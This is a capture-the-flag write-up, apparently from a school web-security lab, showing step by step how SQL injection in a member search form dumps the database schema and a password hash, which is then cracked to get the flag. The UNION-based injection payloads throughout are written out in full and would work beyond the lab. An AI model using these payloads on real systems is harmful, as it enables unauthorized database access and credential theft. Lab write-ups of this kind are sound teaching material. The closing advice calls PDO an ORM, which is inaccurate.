Injection sql search members :
If we submit nothing we see an SQL error, so we know it's not well protected.
so we try :

1 or 1 = 1 
-> and we get 4 profiles with their first names and surname

One of them is GetThe Flag (surname first name);
so we need to get more information, first we get all tables name and colmums name with :

1 or 1=1 UNION select table_name, column_name FROM information_schema.columns
-> we can see a table named users, with severals columns : user_id, first_name, last_name, town, country, planet, Commentaire, countersign

First try :
1 or 1=1 UNION SELECT town, country  FROM users
First name: 42
Surname : 42

Second try :
1 UNION select planet, Commentaire from users
ID: 1 UNION select planet, Commentaire from users 
First name: 42
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
-> this surname is interesting, let's see the last column of users

1 UNION select countersign, Commentaire from users
ID: 1 UNION select countersign, Commentaire from users 
First name: 5ff9d0165b4f92b14994e5c685cdce28
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !

md5 ( 5ff9d0165b4f92b14994e5c685cdce28 ) = FortyTwo

Sh256 ( fortytwo ) = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

This is our FLag !


This can be used to extract data form DB. 

To prevent you can use an Object Relation Mapping ORM like PDO in PHP.
